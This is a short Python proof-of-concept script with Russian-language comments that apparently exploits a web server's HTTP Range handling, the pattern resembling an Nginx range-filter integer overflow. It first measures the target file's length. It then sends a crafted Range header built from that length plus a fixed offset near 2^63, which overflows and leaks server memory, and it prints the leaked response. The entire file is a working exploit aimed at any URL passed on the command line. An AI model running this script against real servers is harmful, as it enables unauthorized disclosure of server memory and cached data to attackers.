#!/usr/bin/env python
import sys
import requests

if len(sys.argv) < 2:
    print("%s url" % (sys.argv[0]))
    print("eg: python %s http://your-ip:8080/" % (sys.argv[0]))
    sys.exit()

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
}
offset = 605
url = sys.argv[1]

# Добавляем таймауты для всех запросов
timeout = 10

print(f"[*] Подключение к {url}...")
try:
    response = requests.get(url, headers=headers, timeout=timeout)
    file_len = len(response.content)
    print(f"[+] Получен ответ, размер файла: {file_len} байт")
except requests.exceptions.RequestException as e:
    print(f"[-] Ошибка подключения: {e}")
    sys.exit(1)

n = file_len + offset
headers['Range'] = "bytes=-%d,-%d" % (
    n, 0x8000000000000000 - n)

print(f"[*] Отправка Range запроса...")
print(f"[*] Range заголовок: {headers['Range']}")
try:
    # Увеличиваем таймаут для Range запроса, так как уязвимость может обрабатываться дольше
    r = requests.get(url, headers=headers, timeout=30)
    print(f"[+] Получен ответ (статус: {r.status_code}, размер: {len(r.content)} байт)")
    print("=" * 60)
    print(r.text)
    print("=" * 60)
except requests.exceptions.Timeout as e:
    print(f"[-] Таймаут Range запроса: {e}")
    print("[!] Это может быть нормальным для данной уязвимости - сервер может обрабатывать запрос долго")
    sys.exit(1)
except requests.exceptions.RequestException as e:
    print(f"[-] Ошибка Range запроса: {e}")
    sys.exit(1)
